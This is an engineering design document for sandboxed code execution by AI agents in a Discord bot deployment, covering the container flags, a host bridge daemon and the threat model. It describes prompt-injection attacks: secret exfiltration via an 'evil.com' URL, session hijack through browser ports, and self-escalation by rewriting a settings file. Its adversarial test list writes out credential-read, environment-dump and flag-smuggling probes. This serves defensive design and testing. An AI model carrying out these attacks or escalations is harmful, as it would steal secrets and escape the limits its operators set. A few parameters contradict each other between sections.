# Sandboxed Code Execution for Agents — Design

**Date:** 2026-07-26
**Status:** Approved pending review

## Overview

Agents get a general-purpose code execution tool: `mcp__sandbox__run(command)` runs an
arbitrary shell command in a throwaway Docker container that holds **no secrets, no
Claude credentials, and no other agent's data**. The calling agent's workspace is the
only writable mount, at the same path it has in the bot container.

Containers are spawned by a **host-side bridge daemon**, mirroring the existing
`scripts/playwright-bridge/`. The Docker socket never enters the bot container.

The immediate motivation is letting agents produce **animated algorithm
visualizations** (Manim → mp4 → Discord attachment), but that is a thin layer on top:
one image dependency and one shared skill. The sandbox is the real deliverable.

### Why this exists

Agents today have `Write` scoped to their workspace and `/tmp`, and a `Bash` tool that
is present but effectively inert — it is absent from `settings.json`'s allow list, so
anything beyond the auto-approved read-only set (`cat`/`ls`/`head`/`tail`/`wc`, itself
path-checked against cwd + `additionalDirectories`) requires interactive approval a
headless stream-json process can never grant. That is safe but limiting — anything computational has to be hand-written by the model
or wrapped in a purpose-built MCP (`latex-resume` is the precedent, and it exists
solely because compiling a `.tex` file needed a subprocess). A generic sandbox
replaces the "write a new MCP per capability" pattern for everything that is just
*running code*.

### Relationship to the 2026-03-24 sandbox investigation

[`docs/sandbox-investigation/README.md`](../../sandbox-investigation/README.md)
evaluated exactly this problem and chose differently. That decision must be re-derived
here, not inherited, because **this design removes its load-bearing assumption.**

That investigation compared:

- **Option A (chosen):** no inner sandbox, Docker defaults preserved. Safe against
  container escape and runtime CVEs.
- **Option B (rejected):** Claude Code's bwrap sandbox inside the bot container.
  Blocks credential reads at the OS level, but requires `SYS_ADMIN`, `NET_ADMIN`,
  `apparmor:unconfined`, and a custom seccomp profile — precisely the primitives
  container-escape exploits need.

Its stated rationale for A was: *"Avoid granting Bash permissions to agents entirely.
Without Bash, the prompt injection credential exfiltration vector is eliminated at the
application layer."* The safety of the current setup rests on agents being unable to
execute code — and this project changes that.

**Re-verified 2026-07-26.** Reads *and* writes outside the agent's own workspace are
currently blocked — `/root/.claude/*`, `/claub/config/*`, and other agents'
workspaces all deny, through the Read tool, through read-only Bash, and through
obfuscated `python3 -c`. Tested against production `settings.json` and production cwd
with a deliberately compliant agent definition, so the result measures enforcement
rather than the agent's own refusal. Three "VULNERABLE" rows in that document's threat
table are therefore stale, and it has been annotated.

**The important caveat: none of that protection is configured — it is upstream CLI
behavior.** It can regress on a Claude CLI upgrade with no change on this side. The
Dockerfile pins `@anthropic-ai/claude-code@2.1.219`, so upgrades are deliberate, but a
version bump should re-run the probes in the testing section below.

**The throwaway container resolves the tension that investigation identified rather
than picking a side in it.** Option B's isolation was expensive because it had to
happen *inside* the container holding the credentials. Here it happens in a separate
container that never had them. The bot container's Docker hardening is untouched — no
`SYS_ADMIN`, no `NET_ADMIN`, no seccomp relaxation, no AppArmor exception — so the
escape and supply-chain risk that motivated Option A is unchanged, while the
prompt-injection protection that motivated Option B is obtained for free.

Two of that document's standing recommendations are also touched:

- **#3 (restrict network egress)** — deliberately *not* adopted for the sandbox, on the
  grounds that `WebFetch` already provides the same reach. See the network decision
  record below.
- **#4 (cross-agent memory poisoning)** — improved, not solved. Code in the sandbox can
  reach only the calling agent's workspace, so this execution path cannot poison
  another agent's memory. Whether the *agent itself* can still write cross-workspace
  through its normal tools is a separate pre-existing question, under investigation.

## Decision Records

### Host-side bridge, not a Docker socket in the bot container

Mounting `docker.sock` into the bot container is the simplest way to spawn containers,
and it was rejected: the socket is root-equivalent on the Docker host, and this entire
project is about *loosening* what agents can execute. A host-side daemon keeps that
authority where it already lives, and reuses a daemon pattern this deployment already
runs and understands.

A long-lived per-agent sidecar on an internal network was also rejected — it needs
per-agent uid separation over per-agent-chowned workspaces to prevent cross-agent
reads, which is more machinery for a saving of roughly 0.5 s of container startup.

### Ephemeral container per call, not a persistent session

State that matters lives in the workspace, which persists regardless. A fresh
container per call means no cleanup, no lifecycle management, and no "works on my
last run" stale-state bugs. The one thing ephemerality would normally cost —
persistent Python dependencies — is recovered by putting the venv in the workspace
(below).

### Network: `run` has none, `install` has it under a fixed command

An earlier draft gave the sandbox unrestricted network on the reasoning that agents
already hold `WebFetch`, so `WebFetch("https://evil.com/?d=<secret>")` means network
adds bandwidth rather than a new capability class. That reasoning is correct about
*exfiltration* and wrong about everything else, which measurement made clear.

**Measured 2026-07-26.** An ad-hoc `docker run --network bridge` container reached the
playwright bridge's `/status` endpoint and found `main`'s browser MCP port open:

```
--- playwright bridge :9500 (bound 127.0.0.1) --- {}
--- playwright MCP :3846 (bound 127.0.0.1) --- PORT OPEN
```

Binding to `127.0.0.1` does **not** protect these services, because Lima's user-mode
networking proxies `host.docker.internal` (192.168.5.2) through to host loopback. Those
playwright MCPs drive browsers holding live authenticated sessions. Injected code in
one agent's sandbox POSTing to another agent's port is **session hijack** — something
`WebFetch` cannot do, and a capability class of its own. It also collapses exactly the
agent-to-agent isolation the rest of this design maintains.

Blocking the host alone was considered and rejected. `--add-host
host.docker.internal:127.0.0.1` is name-only and 192.168.5.2 stays routable; iptables
inside the Colima VM is state outside docker-compose that will not survive `colima
start`; `@playwright/mcp` offers only `--allowed-hosts`, a Host-header check a
container can forge. None of them address the LAN — Home Assistant, the router,
anything else reachable by raw IP.

**Therefore:**

- `run(command)` gets `--network none`. Arbitrary code never has network.
- `install(packages)` gets the default bridge network, but can only ever execute
  `uv pip install` against names matching `^[A-Za-z0-9._-]+(==[A-Za-z0-9._-]+)?$`. The
  command shape is fixed by the server; the agent supplies names, never flags. This
  preserves unfrozen dependencies, which was the entire point of allowing network.

Cost: a script cannot fetch a dataset mid-run. The existing `file-download` MCP already
covers URL-to-workspace fetching under its own least-privilege rules.

If general network in `run` is ever wanted, the principled design is an egress proxy —
sandbox on an `internal: true` network with a sidecar allowlisting PyPI. That drops in
without redesigning anything here, and is deliberately not built now.

**The shared secret stays**, since `install` has network. Note it was over-credited in
an earlier draft: the schedules/messaging MCP on `:9400` is bound inside the bot
container with no published port, so that recursion vector was never open regardless.

### uv with a workspace venv, not `PIP_TARGET`

`PIP_TARGET` places console scripts in `{target}/bin`, which is not on `PATH` — so
installing a CLI tool and then invoking it fails in a way that is confusing to debug.
A real virtualenv is correct, and `uv` is already in the bot image and already used by
`entrypoint.sh`.

## Architecture

```
Agent (in bot container)
    │  mcp__sandbox__run("manim -ql dijkstra.py DijkstraScene")
    ▼
mcps/sandbox/server.py  (FastMCP, baked into bot image)
    │  POST http://host.docker.internal:9501/exec/{agent}
    │  X-Exec-Secret: <from env, never forwarded to the sandbox>
    ▼
scripts/exec-bridge/bridge.py  (host-side daemon, launchd)
    │  docker run --rm ... -v {host_ws}:/claub/workspaces/{agent} claub-exec
    ▼
claub-exec container  (throwaway, no secrets, no ~/.claude, no other workspaces)
    │  artifacts written to the workspace bind mount
    ▼
Agent replies with [FILE:/claub/workspaces/{agent}/media/.../out.mp4]
    ▼
file_sender.py attaches it to Discord
```

### Component 1 — `scripts/exec-bridge/bridge.py`

Host-side daemon on port 9501. Stdlib `ThreadingHTTPServer`, closely mirroring
`scripts/playwright-bridge/bridge.py`. Ships with a launchd plist template, a
`config.example.json`, and a README, matching that directory's layout.

**Endpoints**

| Method | Path | Body | Response |
|---|---|---|---|
| POST | `/exec/{agent}` | `{"command": str, "timeout": int}` | `{"exit_code", "stdout", "stderr", "timed_out", "duration_s"}` |
| GET | `/status` | — | running container count, per-agent |

**Config** (`config.json`): `workspaces_root` (host path), `image`, `listen_host`,
`listen_port`, `secret`, `max_concurrent`, `default_timeout`, `max_timeout`, and an
`agents` allowlist.

**Input handling.** The agent name arrives in the URL path and becomes part of a bind
mount, so it is the one input that must not be trusted. It is validated against
`^[A-Za-z0-9_-]+$` **and** membership in the config's `agents` list. Rejection is a
404, not a 400 — no information about which agents exist.

The `command` string is passed to `bash -lc` **inside the container** and is
deliberately unvalidated. Shell injection is not a threat here; running arbitrary
commands is the feature. It is passed as a single `subprocess.run` argv element, never
through a host shell.

**Concurrency.** A semaphore, **default 1** — see the host environment section for why.
Requests over the cap queue rather than fail, bounded separately from execution time.

**Output must be capped at the bridge, not just at the MCP.** The MCP truncates to 4000
characters, but that happens *after* the fact. `subprocess.run(..., capture_output=True)`
— the `latex-resume` precedent — buffers the entire stdout in the bridge's memory first.
That is safe for `pdflatex`, whose output is bounded, and unsafe for `run(command)`,
which is arbitrary: `run("yes")` grows the bridge's RSS until the host OOMs. That is a
host-side crash triggered from inside the sandbox, defeating the containment the design
claims. The bridge therefore streams the child's output with a hard byte ceiling
(1 MiB per stream), discarding the excess and marking that it did so.

### Component 2 — `docker/exec-sandbox/Dockerfile` (image `claub-exec`)

`python:3.12-slim` on **linux/arm64**, plus:

- `ffmpeg` and Manim's runtime libraries
- **A full build toolchain**: `build-essential`, `pkg-config`, `libcairo2-dev`,
  `libpango1.0-dev`
- `uv`, pinned
- Baked Python packages: `manim==0.20.1`, `numpy`, `matplotlib`, `networkx`, `pillow`

**The toolchain is mandatory on this host, not optional polish.** Verified against PyPI
for cp312/aarch64: `pycairo` publishes **no Linux wheels at all**, `manimpango`
publishes **no Linux wheels at all**, and `moderngl` ships manylinux x86_64 wheels but
**none for aarch64**. All three build from source here. A runtime-libraries-only apt
list — which an earlier draft specified — fails at `pip install manim` on the first
attempt.

**The toolchain stays in the final image rather than being stripped in a multi-stage
build.** It is not only needed for the bake: `install` exists so dependencies aren't
frozen, and on aarch64 any sdist-only package needs a compiler *at runtime*. Stripping
it would quietly break that promise on this architecture. Roughly 250 MB, worth it.

`manim` is pinned so phase 2's verified example scenes target a known API.

Never appears in `docker-compose.yml` — it is only ever `docker run --rm`. Built by a
documented `docker build` step in the bridge README.

**No LaTeX.** Manim's `MathTex`/`Tex` require `texlive-latex-extra`,
`texlive-fonts-extra`, `texlive-science` and `dvisvgm` — roughly 1 GB. The skill
directs agents to `Text`/`MarkupText` instead. Revisit only if math typesetting turns
out to matter.

### Component 3 — `mcps/sandbox/server.py`

FastMCP server baked into the bot image at `/app/mcps/`, following the `latex-resume`
shape: reads `CLAUB_AGENT_NAME` from the environment at startup and fails loudly if
absent.

Two tools:

```python
run(command: str, timeout: int = 180) -> str        # JSON; --network none
install(packages: list[str]) -> str                 # JSON; network, fixed command shape
```

`install` validates every name against `^[A-Za-z0-9._-]+(==[A-Za-z0-9._-]+)?$` and
builds the argv itself, so an agent can never smuggle a flag such as `--index-url`. It
bootstraps `{workspace}/.venv` on first use.

The agent name is **not** a parameter — it comes from the process environment and goes
into the URL path. An agent cannot address another agent's sandbox.

Returns JSON with `exit_code`, `stdout`, `stderr`, `timed_out`, `duration_s`. stdout
and stderr are each truncated to 4000 characters (the `latex-resume` precedent), tail-
biased, with an explicit truncation marker so the agent knows output was dropped.

When the bridge is unreachable, the error says so in terms the agent can act on —
"sandbox bridge is not running on the host" — rather than surfacing a raw
`ConnectionRefusedError`.

## The `docker run` invocation

```
docker run --rm
  --name claub-exec-{agent}-{uuid}
  --network none
  --read-only
  --tmpfs /tmp:size=256m,exec
  --cap-drop ALL
  --security-opt no-new-privileges
  --memory 1g --cpus 1.5 --pids-limit 256
  -e HOME=/tmp
  -e MPLCONFIGDIR=/tmp/mpl
  -e UV_CACHE_DIR=/claub/workspaces/{agent}/.uv-cache
  -e UV_PYTHON_DOWNLOADS=never
  -e PATH=/claub/workspaces/{agent}/.venv/bin:/usr/local/bin:/usr/bin:/bin
  -v {host_workspaces_root}/{agent}:/claub/workspaces/{agent}
  -v {host_workspaces_root}/{agent}/.claude:/claub/workspaces/{agent}/.claude:ro
  -w /claub/workspaces/{agent}
  claub-exec
  bash -c "<command>"
```

Five details that are load-bearing:

**`.claude/` must be mounted read-only, or the entire design is defeated.** The
workspace contains a real `.claude/` directory (verified: it holds `agents` and `skills`
symlinks pointing at `../.claude-agents` and `../.claude-skills`). The Claude CLI runs
with `cwd` = workspace and merges *project-level* settings from
`{cwd}/.claude/settings.json` and `settings.local.json`, where allow rules **expand**
permissions. Claude Code blocks agents from writing there — but that block lives in the
tool layer, and the sandbox bypasses the tool layer entirely. Without this mount,
injected code writes a permissive `settings.local.json` and the agent escalates its own
permissions on its next turn, which is precisely the escape the sandbox exists to
prevent.

The nested read-only bind is the whole fix, and it costs nothing: agent-authored skills
still work, because `.claude/skills` is a *symlink* to `../.claude-skills`, which sits
on the writable parent mount. Writes through the symlink land outside the read-only
mount.

**`--network none` for `run`.** See the network decision record.

**`bash -c`, not `bash -lc`.** A login shell sources `/etc/profile`, which resets
`PATH` and would silently discard the workspace venv's `bin` directory — producing
"I installed it and the command still isn't found" as the default experience.

**The environment is clean because Docker makes it clean.** A container receives only
the image's `ENV` plus the explicit `-e` flags above; it does not inherit the
environment of whatever spawned it. The bridge passes six benign variables and nothing
else, so no `.envrc` secret and nothing from the bot container can reach the sandbox.
This is a property of `docker run`, not something the bridge has to actively scrub.

**The workspace mounts at its bot-container path, not `/work`.** Otherwise every
render returns a `/work/media/...` path that the agent must translate before putting it
in a `[FILE:]` marker — a recurring error for no benefit. Identical paths everywhere
means no translation ever.

**Path identity has one documented exception: compose-injected submounts.**
`docker-compose.yml:22-24` bind-mounts `/Users/you/repos/shared/data` into three agents
at `{workspace}/shared-data` — `career`, `analyst`, and **`leetcode-coach`, the
phase-1 pilot**. Those mounts exist only inside the bot container; on the host,
`~/docker/claub/workspaces/leetcode-coach/shared-data/` is an empty directory (verified).
The bridge mounts the host workspace, so the sandbox would see the empty directory —
reads silently return nothing and writes vanish behind the compose overlay. This is a
silent data-absence bug, not an error.

Phase 1 handles it by **declaration, not replication**: the bridge config carries an
optional `extra_mounts` list per agent, and the implementation seeds it from
`docker-compose.yml` so `shared-data` resolves identically in both containers. The
`algorithm-animation` skill has no reason to touch it, but leaving a silent
wrong-answer path in the pilot agent is not acceptable. Any future compose submount
must be added in both places — noted in the bridge README.

**Root inside the container is accepted.** Under Colima that is root in the Lima VM,
not on macOS — the same VM boundary the 2026-03-24 investigation weighed when it noted
"the Colima VM provides a meaningful additional boundary." `--cap-drop ALL`,
`--security-opt no-new-privileges`, and a read-only root filesystem are the actual
containment; a non-root uid would additionally require chowning workspaces that the bot
writes as root, trading a real permissions problem for a marginal gain.

`--read-only` is compatible with `uv`: the venv, the uv cache, and all build output
live on the workspace mount, and `HOME`/`MPLCONFIGDIR`/scratch live on the tmpfs.

## Host environment (Colima)

The host runs **Colima**, not Docker Desktop, and its allocation is the binding
constraint on this design:

| | |
|---|---|
| VM | Colima on macOS Virtualization.framework (vz), aarch64 |
| Allocation | **2 CPU → 4 CPU**, 4 GiB RAM, 100 GiB disk |
| Mount type | **virtiofs** |
| Docker socket | `unix:///Users/you/.colima/default/docker.sock`, context `colima` |
| Mac | 8 GB RAM, 8 cores |
| Already resident | 5 containers (~510 MiB) — three Claub instances, `shared`, `icf-emulator` |

**Memory is the scarce resource, not CPU.** The Mac has 8 GB total and macOS needs most
of what Colima doesn't take, so the VM's 4 GiB stays fixed; roughly 3.3 GiB of it is
free. CPU is not exclusively reserved and the 8 cores are mostly idle, so the VM's CPU
allocation is being raised 2 → 4 (`colima stop && colima start --cpu 4 --memory 4`) as
a **prerequisite step** — it roughly halves render times for free. That restart takes
the running containers down briefly, including all three Claub bots.

Two unused containers (`openai-edge-tts`, `wyoming_openai`) were stopped on 2026-07-26,
freeing ~200 MiB and the ~18% of a core the former consumed continuously. They are
stopped, not removed — `docker start` restores them, and `restart=unless-stopped` means
an explicit stop persists.

This is why the sandbox gets `--memory 1g --cpus 1` and a concurrency cap of 1. An
earlier draft specified 2g/2cpu with a cap of 3, which asks for 6 GB and 6 CPUs from a
4 GiB VM. `-ql` (480p15) is consequently close to a requirement for Manim, not just a
default.

**virtiofs is a relief, not a risk.** Under Colima's older sshfs default, creating a
venv and writing Manim's many small partial-movie files across the mount would have
been painfully slow. It isn't.

**The launchd plist must set `DOCKER_HOST` explicitly.** The bridge shells out to
`docker`, which resolves the `colima` context from `~/.docker/config.json` — HOME-
dependent, and launchd environments are minimal. `playwright-bridge`'s plist template
sets only `PATH`, and it never needed the docker CLI. Setting
`DOCKER_HOST=unix:///Users/you/.colima/default/docker.sock` in the plist removes the
ambiguity entirely.

**arm64 is an open build risk.** This is aarch64 Linux. Manim pulls `pycairo`,
`ManimPango`, `moderngl`, `mapbox-earcut`, and `skia-pathops`; linux/arm64 wheel
coverage across those is uneven and some may need source builds with extra Dockerfile
build dependencies. **Build the `claub-exec` image first in phase 1**, before the bridge
or the MCP, so this surfaces while it is still cheap to change course.

## Concurrency

Four distinct races, two of which need explicit handling at a cap of 1.

**Different agents, simultaneous calls.** Each gets its own container and its own
workspace mount; there is no shared mutable state. Serialized by the global semaphore.

**Same agent, simultaneous calls.** `AgentProcess` serializes turns per agent, but
Claude can emit *parallel tool calls within a single turn*, so one agent can fire two
`run` calls at once. Both mount the same workspace and may race on `{workspace}/.venv`
(two concurrent `uv venv` bootstraps corrupt it) or write the same output file.

At a global cap of 1 this is already handled — everything serializes — so **no
per-agent lock is built**. The reasoning is recorded because the moment the cap is
raised above 1, the race becomes live and a per-agent lock is required alongside the
global semaphore.

**Timeouts must kill the container, not the client.** `subprocess.run(["docker",
"run", ...], timeout=N)` kills the *docker CLI process*; the container keeps running,
still holding CPU and its workspace mount. Each run therefore gets an explicit
`--name claub-exec-{agent}-{uuid}`, and timeout handling issues `docker rm -f {name}`
before returning `timed_out: true`.

**Orphans.** On startup the bridge reaps anything left behind by a crash:
`docker ps -aq --filter name=claub-exec- | xargs -r docker rm -f`.

### Timeout budget

Queue wait is bounded separately from execution, so a queued call fails fast with an
actionable "sandbox busy, N ahead" rather than silently blocking for minutes. The chain
must be strictly ordered, or the agent sees an opaque MCP timeout instead of the
bridge's structured error:

```
MCP_TOOL_TIMEOUT  >  MCP HTTP client timeout  >  bridge total (queue + exec)  >  exec timeout
     (existing)            600s                        540s                       180s default
                                                                                  600s max
```

Concrete values so the implementer isn't inventing them. `MCP_TOOL_TIMEOUT` is already
raised above default for agent messaging; this must not lower it. Queue wait is
`bridge total − exec timeout`, and exceeding it returns "sandbox busy, N ahead" rather
than blocking to the outer timeout.

**Unbounded growth.** `{workspace}/.venv` and `{workspace}/.uv-cache` accumulate per
agent with nothing pruning them. The bot's startup sweep that handles `.attachments/`
should cover these too — or at minimum the bridge README documents them as manual
cleanup targets.

## Dependency management

The image's baked packages cover the common cases. For anything else, the skill
instructs agents to bootstrap once per workspace:

```bash
uv venv --system-site-packages /claub/workspaces/{agent}/.venv
uv pip install --python /claub/workspaces/{agent}/.venv/bin/python <package>
```

`--system-site-packages` keeps the baked Manim/NumPy visible without reinstalling.
`PATH` already prefers the venv's `bin`, so console scripts work. `UV_CACHE_DIR` points
into the workspace, so a repeat install of the same package is near-instant despite the
container being new.

## Security model

**Contained.** The sandbox has no `~/.claude` (no OAuth credentials), no `.envrc`
secrets, no other agent's workspace, no `/claub/config`, no `/claub/data`, and no
Docker socket. It cannot reach the exec bridge without the shared secret.

**Not contained, by design.** The agent's own workspace is writable, so injected code
can corrupt that agent's own notes and skills. Network egress exists, matching the
exfiltration reach `WebFetch` already provides. Host-side services on the LAN are
reachable.

**Explicit non-goal, stated accurately.** This is not a VM boundary. Containers share
the host kernel, so a kernel exploit escapes into the Colima VM — and that is worse
than "just a VM" sounds. Colima mounts `$HOME` into the VM over **writable virtiofs**,
so an escape lands as root somewhere that can write anywhere under `/Users/you`:
`~/.ssh`, shell rc files, this repo. That is effectively host compromise.

The risk acceptance still stands — the threat model is *a prompt-injected LLM writing
Python*, not a kernel exploit chain, and the bot container is no better protected — but
the description of what is being accepted should be honest.

**Verified clear.** The credential-read and cross-agent-write concerns raised by the
2026-03-24 investigation were probed on 2026-07-26 and are already blocked; no fix was
needed and `settings.json` was not modified. See the re-verification note above,
including the caveat that this protection is upstream behavior rather than
configuration.

**`permissions.deny` syntax, if it is ever needed.** Absolute-path rules require a
**double** leading slash. `Read(/root/.claude/**)` parses without error and silently
does nothing; `Read(//root/.claude/**)` denies correctly. Verified empirically against a
file that was otherwise readable. Note this is a different mechanism from
`sandbox.filesystem.denyRead` in the prior investigation, and it is confirmed only for
the `Read` tool — whether it also constrains read-only Bash was not tested, and the
prior art's finding that `denyRead` misses Bash means it should not be assumed.

## Configuration

**`agents.yaml`** — off by default, opt in per agent:

```yaml
agents:
  leetcode-coach:
    channel_id: "..."
    allowed_tools_additional:
      - "mcp__sandbox__*"
    allowed_skills:
      - algorithm-animation
```

**`mcp.json`** (per-agent `{name}.mcp.json`) — wires `/app/mcps/sandbox/server.py` with
`CLAUB_AGENT_NAME` and the bridge secret. The secret needs threading end to end: host
`.envrc` → `docker-compose.yml` environment → bot container → the MCP's `env` block.
That is a **`docker-compose.yml` change**, which the rest of this design otherwise
avoids.

**Bridge config** — the host `config.json`, with the same secret and the agent
allowlist. The allowlist and `agents.yaml` must agree; a mismatch surfaces as a 404 the
agent can read.

## The visualization layer

Once the sandbox exists, this is a shared skill and one already-baked dependency.

**`/claub/config/skills/algorithm-animation/SKILL.md`**, alongside `amazon-browse` and
`writing-skills`, gated by `allowed_skills` (`discord_bot.py:199` turns everything not
listed into `--disallowedTools Skill(x)`). Enabled for `leetcode-coach` initially; any
agent opts in with one line.

Sandbox usage conventions live in the `run` tool's docstring, which every agent holding
the tool sees automatically — not a second skill.

**Skill contents:**

1. **Two or three complete, verified example scenes** — graph traversal (Dijkstra/BFS),
   array walk (two pointers / sliding window), and DP table fill. Pinned to one ManimCE
   version. This is the core of the skill: copy-and-adapt from a known-good example is
   the most reliable pattern for LLM code generation, and it structurally avoids
   Manim's biggest failure mode for models — training data polluted across `manimlib`,
   `manimgl`, and ManimCE, producing `ShowCreation`/`Create` and `TexMobject`/`MathTex`
   mixups.
2. **House rules.** `-ql` (480p15) by default — fast renders, small files. **mp4, not
   gif** — Discord's free-tier attachment cap is 10 MB and h264 is far more efficient.
   `Text`/`MarkupText` only, no `MathTex` (no LaTeX in the image).
3. **The self-check loop, mandatory.** After rendering, generate a contact sheet — six
   evenly spaced frames tiled into one PNG via `ffmpeg` + Pillow — and `Read` it before
   posting. The agent cannot otherwise see that its labels overlap or that a node
   drifted off-screen, and a "success: true" exit code says nothing about whether the
   animation is legible. This is the single highest-value item in the skill.
4. **Delivery.** Emit `[FILE:/claub/workspaces/{agent}/...mp4]` in the Discord reply.

## Known limitation: Discord attachments

Attachments download to `/tmp/claub-attachments/{agent}/{message_id}/` inside the *bot
container*, which does not exist on the host — so the bridge cannot mount it and the
sandbox cannot see uploaded files. An agent can copy a text file across with
`Read` + `Write`, but not a binary. "Upload a CSV, have the agent plot it" does not
work without a change.

**Recommended fix (pending confirmation):** download into
`{workspace}/.attachments/{message_id}/` instead of container `/tmp`. Only the
destination path in `attachments.py` changes — the footer appended to the message text
keeps its existing format, just with different paths.

It works because the workspace is *already* host-backed and already the sandbox's one
writable mount, so this needs no new mount, no compose change, and no bridge config.
Path identity comes free: the agent can hand an attachment path straight to a script
and it resolves identically in both containers. Dot-prefixed so it stays out of the
agent's normal workspace listing, and the agent can already read, move, and delete
there, so keeping one file and dropping the rest needs no new tooling.

Two consequences to handle:

- Files stop being wiped on container rebuild and accumulate. The agent can prune its
  own, but the bot should sweep entries older than N days at startup.
- `.attachments/` must be gitignored in the workspace — several agents have the git MCP
  and would otherwise commit user uploads into their local history.

`CLAUDE.md`'s message-flow section documents the current `/tmp` path and the
wiped-on-rebuild behavior, so it changes too.

**Alternative considered:** bind-mount a host directory at `/tmp/claub-attachments`.
Costs a `docker-compose.yml` change, a second read-only mount in the bridge, and a
retention sweeper — files would stop being wiped on rebuild and accumulate
indefinitely. Its one advantage is real: inbound user files stay read-only and separate
from agent-authored files, so injected code cannot rewrite what the user uploaded.

Either way this is a **separate change**, not folded into the sandbox work.

## Testing

**Adversarial suite** — this is what makes the security claim real rather than
asserted. Each asserts the sandbox *fails*:

- `cat /root/.claude/.credentials.json` → no such file
- `ls /claub/workspaces/main` → no such directory
- `env | grep -iE 'token|key|secret'` → empty
- writing outside the workspace mount → read-only filesystem
- **`echo x > {workspace}/.claude/settings.local.json` → read-only filesystem.** The
  escalation path; if this ever passes, the design is broken.
- **`curl http://host.docker.internal:9500/status` → no network.** Asserts `run` cannot
  reach the playwright bridge or any browser MCP port. Re-run after any change to the
  network flags.
- `curl http://host.docker.internal:9501/exec/main` without the secret → rejected
  (exercised from `install`, the one path that has network)
- `install(["--index-url=http://evil"])` → rejected by name validation, no network call

**Re-run these after any Claude CLI version bump.** The bot container's protections are
upstream behavior rather than configuration, and nothing else here would catch a
regression.

**Bridge unit tests:** `../` and other traversal in the agent name rejected; unknown
agent 404s; a command exceeding its timeout sets `timed_out` and the container is
reaped; the concurrency semaphore holds under parallel requests; missing or wrong
secret rejected.

**MCP tests:** bridge-down produces an actionable error; stdout/stderr truncation
preserves the tail and marks the truncation; the agent name cannot be overridden by a
tool parameter.

**Manual smoke:** `echo hello` → a Python script → a `uv pip install` that persists
across two separate `run` calls → a full Manim render ending in a Discord post.

## Phasing

**Prerequisite.** `colima stop && colima start --cpu 4 --memory 4`. Restarts every
container including all three Claub bots, so pick the moment.

1. **`claub-exec` image — build and smoke-test this FIRST**, before the bridge or the
   MCP. aarch64 source builds for `pycairo`, `manimpango`, and `moderngl` are the only
   genuinely uncertain step in the plan; surfacing that while nothing depends on it is
   worth more than the natural top-down ordering. Success is `manim -ql` rendering a
   trivial scene inside the container.
2. **Bridge daemon**, launchd plist with `DOCKER_HOST` pinned, config, README.
3. **`mcps/sandbox/`** with `run` and `install`, compose secret threading, per-agent
   wiring. Enabled for one agent.
4. **Adversarial suite.**
5. **Visualization** — the `algorithm-animation` shared skill with verified scenes and
   the contact-sheet loop.

Steps 1-4 are independently valuable and independently testable. Step 5 is small.

## Open Items

- Attachments: workspace `.attachments/` (recommended) vs. host bind mount. Not
  blocking phase 1.
- Whether the `algorithm-animation` skill gets a sanitized copy in `example/`.
- Whether `--tmpfs /tmp:size=256m,exec` is accepted in the `path:opts` short form on
  this Docker version — verify during step 1 rather than assuming. `exec` is needed
  because Docker's tmpfs defaults to `noexec`.
- The playwright `PreToolUse` hook at `/claub/config/hooks/validate-playwright.py` runs
  as a subprocess, outside the tool-permission system, so the new `Read(//claub/config/**)`
  deny rule should not affect it. That is reasoning, not measurement — confirm with one
  real browser call next time Playwright is used.
- Raising `max_concurrent` above 1 requires adding the per-agent lock (documented in
  Concurrency) and re-checking the invariant
  `max_concurrent × memory + ~2 GiB ≤ VM RAM`.
